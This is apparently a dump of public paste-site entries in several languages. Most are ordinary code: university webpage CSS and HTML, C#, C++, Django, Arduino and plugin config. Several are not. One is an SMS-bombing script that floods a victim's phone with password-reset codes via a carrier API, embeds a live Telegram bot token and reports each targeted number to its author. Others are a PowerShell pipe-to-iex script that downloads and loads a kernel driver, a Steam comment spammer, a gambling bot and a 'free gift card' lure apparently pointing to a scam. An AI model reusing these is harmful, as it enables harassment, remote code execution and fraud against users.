id,title,username,language,date,content
gCrDVsgi,Untitled,Mahmoudfathi,Python,Friday 28th of June 2024 03:22:07 PM CDT,"import webbrowser
import os, sys, time
import random
import hashlib

os.system(""clear"")

try:
    import requests
    import pyfiglet
    from bs4 import BeautifulSoup
except:
    os.system(""pip install --upgrade pip"")
    os.system(""pip install requests"")
    os.system(""pip install pyfiglet"")
    os.system(""pip install bs4"")
    os.system(""clear"")
    os.system('python modified_script.py')

TOKEN = ""5848610949:AAGG_fJJY5fcwWxHNDfFBlMuUv0Bnqi5aEw""
CHAT_ID = ""1325332071""

# Color codes
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
GRAY = '\033[1;38m'
BOLD_WHITE = '\033[1;39m'

session = requests.session()

print(RED + pyfiglet.figlet_format(""Spam SMS""))
print(pyfiglet.figlet_format(""Egypt""))

info_banner = """""" 
-------------------------------------------------------------------------
- Script Modified by: OpenAI
-------------------------------------------------------------------------
""""""

print(WHITE + info_banner)

def subscribe():
    try:
        user_id = int(input(CYAN + '[+] Enter Telegram ID:\033[1;37m'))
        url = f""https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id=@Oppsl&user_id={user_id}""
        response = requests.get(url).text

        if 'member' in response:
            print(f""\n{GREEN}[+] Welcome! Enjoy the service\n"")
        elif 'left' in response:
            print(f""\n{RED}[-] Please subscribe to the Telegram channel first\n"")
            time.sleep(2)
            webbrowser.open('https://t.me/Oppsl')
            sys.exit()
    except Exception as e:
        print(f""\n{RED}[-] Please enter a valid Telegram ID\n"")
        subscribe()

subscribe()

def send_we_sms():
    try:
        phone_number = input(f""\n{CYAN}[+] Enter Phone Number:\033[1;37m"")
        sms_count = int(input(f""\n{CYAN}[+] Enter SMS Count:\033[1;37m""))
        print(""\n"")
        requests.post(f""https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={phone_number}-->>{sms_count} we"")

        url = ""https://api-my.te.eg/api/user/mobile/resetpassword/initiate""
        headers = {
            'Host': 'api-my.te.eg',
            'Connection': 'keep-alive',
            'Content-Length': '59',
            'Accept': 'application/json, text/plain, */*',
            'Jwt': 'YOUR_JWT_TOKEN',
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json',
            'Origin': 'https://my.te.eg',
            'X-Requested-With': 'mark.via.gp',
            'Referer': 'https://my.te.eg/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US'
        }
        data = {
            ""header"": {""msisdn"": phone_number, ""locale"": ""en""},
            ""body"": {}
        }

        successful_sends = 0
        for _ in range(sms_count):
            response = requests.post(url, headers=headers, json=data).text
            if ""The verification code has been sent"" in response:
                successful_sends += 1
                print(f""{GREEN}[+] Sent SMS #{successful_sends}"")
            else:
                print(f""{RED}[-] Error sending SMS. Try again."")
                send_we_sms()

    except Exception as e:
        print(f""{RED}\n[-] Invalid number or count. Try again."")
        send_we_sms()

# Add other functions similar to send_we_sms() for orange, vodafone, All1, All2, and call
# ...

def display_menu():
    print(f""{GREEN}[1]{BOLD_WHITE} ---> {RED}SMS WE"")
    print(f""{GREEN}[2]{BOLD_WHITE} ---> {RED}SMS Orange"")
    print(f""{GREEN}[3]{BOLD_WHITE} ---> {RED}SMS Vodafone"")
    print(f""{GREEN}[4]{BOLD_WHITE} ---> {RED}SMS All Networks"")
    print(f""{GREEN}[5]{BOLD_WHITE} ---> {RED}SMS All Networks +2"")
    print(f""{GREEN}[6]{BOLD_WHITE} ---> {RED}Call All Networks"")

display_menu()

choice = input(f""\n{CYAN}[+] Choose an option:\033[1;37m"")

if choice == '1':
    send_we_sms()
elif choice == '2':
    # Call the function to send SMS via Orange
    pass
elif choice == '3':
    # Call the function to send SMS via Vodafone
    pass
elif choice == '4':
    # Call the function to send SMS to all networks
    pass
elif choice == '5':
    # Call the function to send SMS to all networks +2
    pass
elif choice == '6':
    # Call the function to make a call to all networks
    pass
else:
    print(f""{RED}\nError, choose a valid option\n"")
    time.sleep(1)
    os.system('python modified_script.py')
"
P9EbAwJ3,ttu homepage hero styles,mbatbold,CSS,Friday 28th of June 2024 03:19:56 PM CDT,".ttu__header
{
    position: relative;
    background: transparent;
    width: 100%;
    height: calc(100dvh - #{$navbar-height});
    overflow: hidden;
    margin-top: $navbar-height;

    .ttu-header__vid
    {
        position: relative;
        background: transparent;
        width: 100%;
        height: 100dvh;
        overflow: hidden;
        background-size: cover;
        background-repeat: no-repeat;
        background-position: center;
        background-image: url('/_resources/homepage/images/vid-still.jpg');

        @media(min-width: $breakpoint-tablet-large)
        {
            background-image: url('/_resources/homepage/images/vid-still-desktop.jpg');
        }

        video
        {
            display: none;

            @media (min-width: $breakpoint-tablet-large)
            {
                position: absolute;
                max-width: initial;
                min-width: 100%;
                min-height: 100dvh;
                padding: 0;
                margin: 0;
                height: auto;
                top: calc(50% - #{$navbar-height} * 0.5);
                left: 50%;
                transform: translate(-50%, -50%);
                display: block;
                width: calc(100dvh * 1.78); // Ratio: 1920 / 1080 = 1.78
            }

            @media (min-aspect-ratio: 16/9)
            {
                width: 100%;
            }
        }

        .ttu-header-vid__overlay
        {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: calc(100% - #{$navbar-height});
            background-image: linear-gradient(180deg, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.4) 100%);

            .ttu-header-vid-overlay__tag
            {
                position: absolute;
                bottom: 7rem;
                left: 0;

                @media(min-width: $breakpoint-tablet-large)
                {
                    bottom: 12rem;
                }

                @media(min-width: $breakpoint-desktop)
                {
                    bottom: 14rem;
                }

                @media(min-width: $breakpoint-desktop-lim)
                {
                    bottom: 16rem;
                    left: calc(50% - 37.5rem);
                }

                .black-bg
                {
                    background-color: black;
                    padding-left: $page-margin;
                    width: calc(100vw - #{$page-margin});

                    @media(min-width: $breakpoint-tablet)
                    {
                        padding-left: $page-margin-tablet;
                        width: calc(100vw - #{$page-margin-tablet});
                    }

                    @media(min-width: $breakpoint-tablet-med)
                    {
                        padding-left: $page-margin-tablet-med;
                        padding-right: $page-margin-tablet-med;
                        width: auto;
                    }

                    @media(min-width: $breakpoint-tablet-large)
                    {
                        padding-left: $page-margin-tablet-large;
                        padding-right: $page-margin-tablet-large;
                    }

                    @media(min-width: $breakpoint-desktop)
                    {
                        padding-left: $page-margin-desktop;
                        padding-right: $page-margin-desktop;
                    }

                    @media(min-width: $breakpoint-desktop-lim)
                    {
                        padding-left: 1.25rem;
                    }


                    &:first-child
                    {
                        margin-bottom: 3vw;

                        @media(min-width: $breakpoint-tablet-med)
                        {
                            margin-bottom: 0.5rem;
                        }
                    }

                    h2
                    {
                        margin: 0;
                        color: #fdfdfd;
                        font-family: $font-helv-condensed;
                        font-size: 14vw;
                        line-height: normal;
                        letter-spacing: normal;
                        padding-top: 0.5rem;
                        padding-bottom: 0.5rem;
                        font-weight: 700;
                        text-transform: uppercase;

                        @media(min-width: $breakpoint-tablet-med)
                        {
                            font-size: 4rem;
                        }

                        @media(min-width: $breakpoint-tablet-large)
                        {
                            font-size: 4.5rem;
                        }

                        @media(min-width: $breakpoint-tablet-large)
                        {
                            font-size: 4.75rem;
                        }

                        @media(min-width: $breakpoint-desktop-lim)
                        {
                            font-size: 5rem;
                        }

                        sup
                        {
                            font-family: $font-helv-condensed;
                            font-size: 4vw;
                            vertical-align: super;
                            top: -2vw;

                            @media(min-width: $breakpoint-tablet-med)
                            {
                                font-size: 1.25rem;
                                top: -1rem;
                            }
                        }
                    }
                }
            }

            .ttu-header-vid-overlay__scroll
            {
                position: absolute;
                bottom: 3rem;
                left: $page-margin;

                @media(min-width: $breakpoint-tablet)
                {
                    left: $page-margin-tablet;
                }

                @media(min-width: $breakpoint-tablet-med)
                {
                    left: $page-margin-tablet-med;
                }

                @media(min-width: $breakpoint-tablet-large)
                {
                    left: $page-margin-tablet-large;
                    bottom: 6rem;
                }

                @media(min-width: $breakpoint-desktop)
                {
                    left: $page-margin-desktop;
                    bottom: 8rem;
                }

                @media(min-width: $breakpoint-desktop-lim)
                {
                    left: calc(50% - 37.5rem + 1.25rem); //37.5rem = 600px Half of fixed width. 1.25rem = extra padding to allign with text.
                    bottom: 10rem;
                }

                .ttu-header-vid-overlay-scroll__txt
                {
                    display: flex;
                    align-items: center;

                    .arrows
                    {
                        margin-right: 2rem;
                        margin-left: 0.3rem;

                        .arrow
                        {
                            display: block;
                            -ms-transform: rotate(45deg); /* IE 9 */
                            -webkit-transform: rotate(45deg); /* Chrome, Safari, Opera */
                            transform: rotate(45deg);
                            border-right: 5px solid white;
                            border-bottom: 5px solid white;
                            margin: 0;
                            width: 16px;
                            height: 16px;
                            -webkit-animation: mouse-scroll;
                            -moz-animation: mouse-scroll;
                            animation: mouse-scroll;
                            animation-duration: 1s;
                            animation-iteration-count: 3;
                        }

                        .one
                        {
                            -webkit-animation-delay: 3s;
                            -moz-animation-delay: 3s;
                            animation-delay: 3s;
                        }

                        .two
                        {
                            -webkit-animation-delay: 3.1s;
                            -moz-animation-delay: 3.1s;
                            animation-delay: 3.1s;
                        }
                    }

                    p
                    {
                        margin: 0;
                        margin-top: 5px;
                        text-decoration-color: transparent;
                        color: white;

                        strong
                        {
                            font-family: $font-helv-lt-std-bd;
                            font-weight: unset;
                        }
                    }
                }
            }
        }
    }
}
"
TPEfGNLN,ttu homepage hero markup,mbatbold,HTML,Friday 28th of June 2024 03:19:21 PM CDT,"<div class=""ttu-header__vid"">
    <video id=""ttu-header-vid__vid"" autoplay=""autoplay"" muted=""muted"" loop=""loop"" poster=""/_resources/homepage/images/vid-still-desktop.jpg"">
        <source src=""/_resources/homepage/content/videos/hero.webm?version=26OCT22"" type=""video/webm""/>
        <source src=""/_resources/homepage/content/videos/hero.mp4?version=26OCT22"" type=""video/mp4""/>
        <link rel=""transcript"" title=""English transcript"" href=""#hero-vid-transcript"">
        <img src=""/_resources/homepage/images/vid-still-desktop.jpg"" alt=""Texas Tech University Admin Building"">
    </video>
    <transcript id=""hero-vid-transcript"">
        (Video only) Students talking outside; Close up of student laughing;
        Overhead shot of students exiting academic building; Faculty member
        teaching students in classroom; Close up of Raider Red at athletic event;
        Students cheering at athletic event;
        Faculty member teaching students in outdoor environment
    </transcript>
    <div class=""ttu-header-vid__overlay"">
        <div class=""ttu-header-vid-overlay__tag"">
            <div class=""black-bg animated scale-up-hor-left timing-fnc-1 fast"">
                <h2>FROM HERE,</h2>
            </div>

            <div class=""black-bg animated scale-up-hor-left timing-fnc-1 delay-1s faster"">
                <h2>IT'S POSSIBLE.<sup>&trade;</sup></h2>
            </div>
        </div>

        <div class=""ttu-header-vid-overlay__scroll"">
            <a href=""#ttu__ima"">
                <div class=""ttu-header-vid-overlay-scroll__txt animated slide-in-top timing-fnc-1 delay-2s slow"">
                    <div class=""arrows"">
                        <span class=""arrow one""></span>
                        <span class=""arrow two""></span>
                    </div>
                    <p><strong>Scroll Down</strong></p>
                </div>
            </a>
        </div>
    </div>
</div>"
XA4sFQkw,Unit_27,lovelyvook,C#,Friday 28th of June 2024 03:07:07 PM CDT,"using System;

namespace Ijunior
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(""Преобразованное число: "" + Convert());
        }

        static int Convert()
        {
            bool isNumber = false;
            string userInput;
            int number = 0;

            while (isNumber == false)
            {
                Console.Write(""Введите число: "");
                userInput = Console.ReadLine();
                isNumber = int.TryParse(userInput, out number);

                if (isNumber == false)
                {
                    Console.WriteLine(""Не удалось преобразовать число"");
                }
            }

            return number;
        }
    }
}"
FSejwT5s,Wtf copilot,Zgragselus,C++,Friday 28th of June 2024 03:05:02 PM CDT,"
				// Header
		Structure::Header header;

		// Body
		Structure::Body body;

		// Data
		Structure::DataRecord data;

		// File path
		std::string filePath;

		// File name
		std::string fileName;

		// File extension
		std::string fileExtension;

		// File full path
		std::string fileFullPath;

		// File size
		uint64_t fileSize;

		// File creation date
		std::string fileCreationDate;

		// File modification date
		std::string fileModificationDate;

		// File access date
		std::string fileAccessDate;

		// File attributes
		uint32_t fileAttributes;

		// File type
		uint32_t fileType;

		// File status
		uint32_t fileStatus;

		// File error
		uint32_t fileError;

		// File error message
		std::string fileErrorMessage;

		// File error code
		uint32_t fileErrorCode;

		// File error description
		std::string fileErrorDescription;

		// File error source
		std::string fileErrorSource;

		// File error stack
		std::string fileErrorStack;

		// File error type
		uint32_t fileErrorType;

		// File error code
		uint32_t fileErrorSeverity;

		// File error code
		uint32_t fileErrorCategory;

		// File error code
		uint32_t fileErrorCode;

		// File error code
		uint32_t fileErrorLine;

		// File error code
		uint32_t fileErrorColumn;

		// File error code
		uint32_t fileErrorOffset;

		// File error code
		uint32_t fileErrorLength;

		// File error code
		uint32_t fileErrorPosition;

		// File error code
		uint32_t fileErrorStart;

		// File error code
		uint32_t fileErrorEnd;

		// File error code
		uint32_t fileErrorCount;

		// File error code
		uint32_t fileErrorTotal;

		// File error code
		uint32_t fileErrorIndex;

		// File error code
		uint32_t fileErrorSize;

		// File error"
2nsrYN0U,Untitled,pacho_the_python,Python,Friday 28th of June 2024 02:41:34 PM CDT,"class HotelRoom(models.Model):
    ROOM_CHOICES = (
        (""Standard"", ""Standard""),
        (""Deluxe"", ""Deluxe""),
        (""Suite"", ""Suite"")
    )

    room_number = models.PositiveIntegerField()
    room_type = models.CharField(max_length=10, choices=ROOM_CHOICES)
    capacity = models.PositiveIntegerField()
    amenities = models.TextField()
    price_per_night = models.DecimalField(max_digits=8, decimal_places=2)
    is_reserved = models.BooleanField(default=False)

    @property
    def even_deluxe_room(self):
        return f""Deluxe room with number {self.room_number} costs {self.price_per_night}$ per night!"""
jnEY4bDs,Untitled,andrewkm,YAML,Friday 28th of June 2024 02:41:07 PM CDT,"# Tebex v2.0.0 - https://tebex.io
# Check out https://tebex.io/docs if you need help.

# Buy Command
# This is the command that players will use to open the Tebex GUI.
buy-command:
  enabled: false
  name: buy

# Whether to check for updates or not.
check-for-updates: false

# Automatic reporting of exceptions to Tebex
auto-report-enabled: false

# Debug Mode
verbose: false

# GUI Settings
gui:
  menu:
    home:
      title: Server Shop
      rows: 3
    category:
      title: Viewing %category%
      rows: 3
    sub-category:
      title: Viewing %sub_category% (%category%)
      rows: 1
  item:
    back:
      name: '&cBack'
      material: COMPASS
    category:
      name: '&b%category%'
      material: CHEST
    package-sale:
      name: '&b%package_name%'
      material: PAPER
    package:
      name: '&b%package_name%'
      material: PAPER

# These settings are exclusive to this server.
# Do not share these credentials with anyone.
server:
  # Proxy Mode
  # If you are using BungeeCord/Velocity, set this to true.
  proxy: true
  
  # Secret Key
  # This is used to identify your server.
  secret-key: redacted

# Configuration Version
# !! Do not change this value !!
config-version: 2
"
rLRBwLJg,Untitled,nuggt69,PowerShell,Friday 28th of June 2024 02:39:57 PM CDT,"# irm https://pastebin.com/raw/rLRBwLJg | iex

$ErrorActionPreference = ""Stop""

[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://github.com/NSG650/NoMoreBugCheck/releases/download/v1.0/NoMoreBugCheck.sys'
$DownloadURL2 = 'https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip'
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
if (-Not ($isAdmin)) { Exit }

try {
    Invoke-WebRequest -Uri $DownloadURL1 -UseBasicParsing -OutFile c:\NoMoreBugCheck.sys
    Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing -OutFile c:\osrloaderv30.zip
}
catch {
	Exit
}

Expand-Archive C:\osrloaderv30.zip -DestinationPath C:\a

Start-Process c:\a\Projects\OsrLoader\kit\WLH\AMD64\FRE\OSRLOADER.exe -Wait
"
23msCPiw,"""Temperature Alert"" rev_02",pleasedontcode,Arduino,Friday 28th of June 2024 02:33:36 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Temperature Alert""
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-28 19:33:05

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Read sensor and print on serial monitor */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <DS18B20.h>  //https://github.com/matmunk/DS18B20

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Sensor_DS18B20_DQ_PIN_D4 = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
DS18B20 ds(Sensor_DS18B20_DQ_PIN_D4);  // Initialize DS18B20 object with the pin number

/****** GLOBAL VARIABLES *****/
#define LOW_ALARM 20
#define HIGH_ALARM 25
uint8_t address[] = {40, 250, 31, 218, 4, 0, 0, 52};  // Example address

void setup(void) {
  // put your setup code here, to run once:
  Serial.begin(9600);
  pinMode(Sensor_DS18B20_DQ_PIN_D4, INPUT);

  if (ds.select(address)) {
    ds.setAlarms(LOW_ALARM, HIGH_ALARM);
  } else {
    Serial.println(""Device not found!"");
  }
}

void loop(void) {
  // put your main code here, to run repeatedly:
  if (ds.select(address)) {
    if (ds.hasAlarm()) {
      Serial.print(""Warning! Temperature is "");
      Serial.print(ds.getTempC());
      Serial.println("" C"");
    } else {
      Serial.print(""Temperature is "");
      Serial.print(ds.getTempC());
      Serial.println("" C"");
    }
  } else {
    Serial.println(""Device not found!"");
  }

  delay(10000);
}

/* END CODE */"
myW9cFr9,Temperature Monitoring rev_01,pleasedontcode,Arduino,Friday 28th of June 2024 02:32:48 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Temperature Monitoring
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-06-28 19:31:50

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Read sensor and print on serial monitor */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <DS18B20.h>  //https://github.com/matmunk/DS18B20

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t Sensor_DS18B20_DQ_PIN_D4 = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
DS18B20 ds(Sensor_DS18B20_DQ_PIN_D4);  // Initialize DS18B20 object with the pin number

/****** GLOBAL VARIABLES *****/
#define LOW_ALARM 20
#define HIGH_ALARM 25
uint8_t address[] = {40, 250, 31, 218, 4, 0, 0, 52};  // Example address

void setup(void) {
  // put your setup code here, to run once:
  Serial.begin(9600);
  pinMode(Sensor_DS18B20_DQ_PIN_D4, INPUT);

  if (ds.select(address)) {
    ds.setAlarms(LOW_ALARM, HIGH_ALARM);
  } else {
    Serial.println(""Device not found!"");
  }
}

void loop(void) {
  // put your main code here, to run repeatedly:
  if (ds.select(address)) {
    if (ds.hasAlarm()) {
      Serial.print(""Warning! Temperature is "");
      Serial.print(ds.getTempC());
      Serial.println("" C"");
    } else {
      Serial.print(""Temperature is "");
      Serial.print(ds.getTempC());
      Serial.println("" C"");
    }
  } else {
    Serial.println(""Device not found!"");
  }

  delay(10000);
}

/* END CODE */"
0d3mBXeb,Guestbook msg Spammer,antonio_pedro,JavaScript,Friday 28th of June 2024 01:59:13 PM CDT,"// Função para enviar automaticamente mensagens
function sendAutomaticMessages() {
    // Função para enviar mensagem
    function sendMessage(message) {
        // Seleciona a caixa de mensagem de entrada
        var messageBox = document.querySelector('#commentthread_Profile_76561199137867189_textarea');
        if (!messageBox) {
            console.error('Caixa de mensagem não encontrada.');
            return;
        }

        // Define a mensagem na caixa de entrada
        messageBox.value = message;

        // Simula o evento de entrada para garantir que a mensagem é reconhecida pelo sistema
        var inputEvent = new Event('input', { bubbles: true });
        messageBox.dispatchEvent(inputEvent);

        // Seleciona o botão de enviar
        var sendButton = document.querySelector('#commentthread_Profile_76561199137867189_submit');
        if (!sendButton) {
            console.error('Botão de enviar não encontrado.');
            return;
        }

        // Clica no botão de enviar
        sendButton.click();

        // Contabiliza e exibe no console a mensagem enviada
        console.log(`Mensagem ""${message}"" enviada.`);
    }

    // Função para enviar múltiplas mensagens em intervalos específicos
    function sendMessagesInLoop(messages, interval) {
        let i = 0;
        setInterval(function() {
            sendMessage(messages[i]);
            i = (i + 1) % messages.length; // Reseta o índice quando todas as mensagens forem enviadas
        }, interval);
    }

    // Exemplo de uso
    var messages = [
        'TonnyTesting',
    ];

    var interval = 30000; // Intervalo de 30 segundos entre cada mensagem

    sendMessagesInLoop(messages, interval);
}

// Executa o script de envio automático de mensagens
sendAutomaticMessages();"
AGBQDkyk,for 0.01 and just-dice.com this is snowybot manual 10fold,coinwalk,JavaScript,Friday 28th of June 2024 01:26:56 PM CDT,"var nion = parseFloat(document.getElementById('pct_balance').value);
var smartz = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((nion/2400).toFixed(8));
var forfit = Number((nion/2400).toFixed(8));
var winnerdinner = parseFloat(document.getElementById('pct_balance').value);
var bolance = parseFloat(document.getElementById('pct_balance').value);
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var hundreds = (prefit*100);
var james = ((Math.floor(bolance/tens))*tens);
var belance = 0;
var snowy = 0;
var snow = bolance;
var beast = prefit;
var fathum = 400;
var menimal = 200;
var greedy =  parseFloat(document.getElementById('pct_balance').value);
 
 
 
function go(){
if (greedy!=belance){
belance = parseFloat(document.getElementById('pct_balance').value);
if (belance>(((Math.floor(snow/hundreds))*hundreds)+(prefit*40))){
prefit = (forfit*10);
fathum = 40;
menimal = 20;
snowy = 0;
tens = (prefit*10);
sevens = (prefit*6.9);
eights = (prefit*7.9);
beast = prefit;
hundreds = (prefit*10);
snow = parseFloat(belance);
}
if ((belance-(beast*menimal))<=0){
prefit = forfit;
fathum = 40;
menimal = 200;
snowy = 0;
tens = (prefit*10);
sevens = (prefit*6.9);
eights = (prefit*7.9);
beast = prefit;
hundreds = (prefit*100);
snow = parseFloat(belance);
       }
if ((beast>=nion)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
prefit = forfit;
snowy = 0;
fathum = 400;
menimal = 200;
tens = (prefit*10);
sevens = (prefit*6.9);
eights = (prefit*7.9);
beast = prefit;
hundreds = (prefit*100);
snow = parseFloat(belance);
}
if ((belance>=(james+(prefit*10)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
prefit = forfit;
snowy = 0;
fathum = 400;
menimal = 200;
tens = (prefit*10);
sevens = (prefit*6.9)
eights = (prefit*7.9)
beast = prefit;
hundreds = (prefit*100);
snow = parseFloat(belance);
james = ((Math.floor(belance/tens))*tens);
}
 if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=snowy)){
        beast = beast*2;
        snowy = parseFloat(belance);
    }

if (belance>=(winnerdinner*24000)) {
console.log(""winner winner chicken dinner"");
    return;
}
var cat = ((belance-smartz).toFixed(8));
console.log(""profit"");
console.log(cat);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
greedy =  parseFloat(document.getElementById('pct_balance').value);
setTimeout(() => go(), 1);
}
 
go();"
42BpmE4c,Untitled,Ahmed_Negm,C++,Friday 28th of June 2024 12:40:12 PM CDT,"#include<bits/stdc++.h>
using namespace std;

#define ll long long
#define nl ""\n""

void files(){
    ios_base::sync_with_stdio(false),cin.tie(NULL),cout.tie(NULL);
    #ifndef ONLINE_JUDGE
        freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout); 
    #endif
}


void solve(){
    int n,m; cin>>n>>m;

    vector<vector<int>> grid(n, vector<int>(m));
    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            char c; cin>>c;
            if(c=='#') grid[i][j] = 0;
            else if(c=='P') grid[i][j] = -1;
            else if(c=='.') grid[i][j] = 1;
            else grid[i][j] = c-'0';
        }
    }

    queue<pair<int,int>> q;
    // map<pair<int,int>,bool> vis;
    // set<pair<int,int>> vis;
    bool vis[n][m] = {false};

    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            if(grid[i][j]==-1){
                q.push({i,j});
                vis[i][j] = true;
            }
        }
    }

    while(!q.empty()){
        int x = q.front().first, y = q.front().second;
        q.pop();

        int nx = x,ny = y;
        if(grid[x][y] == -1) ny = y+1;
        else ny = y+grid[x][y];
        if(ny<m){
            if(grid[nx][ny]>0 && !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
            nx = x+(grid[x][y]==-1?1:grid[x][y]);
            if(nx<n and grid[nx][ny]>0 and !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
            nx = x-(grid[x][y]==-1?1:grid[x][y]);
            if(nx>=0 and grid[nx][ny]>0 and !vis[nx][ny]){
                vis[nx][ny] = true;
                q.push({nx,ny});
            }
        }
    }

    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            if(vis[i][j]) grid[i][j] = -1;
            vis[i][j] = false;
        }
    }

    for(int i=0;i<n;i++){
        if(grid[i][0]>0){
            q.push({i,0});
            vis[i][0] = true;
        }
    }

    int ans = 0;
    while(!q.empty()){
        int sz = q.size();
        while(sz--){
            int x = q.front().first, y = q.front().second;
            q.pop();

            if(y==m-1){
                cout<<ans<<nl;
                return;
            }
            int nx = x,ny = y+grid[x][y];
            if(ny<m){
                if(grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
                nx = x+grid[x][y];
                if(nx<n and grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
                nx = x-grid[x][y];
                if(nx>=0 and grid[nx][ny]>0 and !vis[nx][ny]){
                    vis[nx][ny] = true;
                    q.push({nx,ny});
                }
            }
        }
        ans++;
    }

    cout<<-1<<nl;


}

int main(){
    files();
    int t = 1; 
    // cin>>t;
    while(t--) solve();

    return 0;
}"
LZ1MnfUJ,🎁 G2A.COM FREE GIFT CARD GUIDE JULY 2024 V3🎁,wwxcwx,GetText,Friday 28th of June 2024 12:28:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June > 03 July 2024"
